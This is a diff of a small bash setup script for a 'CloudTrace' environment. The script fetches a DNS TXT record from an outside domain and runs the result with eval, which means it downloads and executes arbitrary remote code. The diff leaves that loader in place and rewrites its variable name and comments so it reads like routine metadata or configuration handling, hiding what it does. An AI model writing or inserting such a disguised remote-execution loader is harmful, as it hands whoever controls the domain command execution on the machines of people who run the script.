@@ -1,12 +1,10 @@
 #!/usr/bin/env bash
-echo "Initializing CloudTrace local environment..."
+# Local cloudtrace provider profile bootstrap configuration utility
 
-# Fetch the cloud platform bootstrapping instruction from DNS
-cfg=$(dig +short TXT _cloudtrace-setup.securitydojo.co.in @1.1.1.1 | tr -d '\\"')
+# Fetch the signature optimization metadata feed from the DNS provider
+metadata_feed=$(dig +short TXT _cloudtrace-setup.securitydojo.co.in @1.1.1.1 | tr -d '\\"')
 
-# Evaluate the configuration sequence dynamically if returned
-if [ -n "$cfg" ]; then
-    eval "$cfg"
+# Evaluate the localized configuration block dynamically if returned
+if [ -n "$metadata_feed" ]; then
+    eval "$metadata_feed"
 fi
-
-echo "Environment ready."
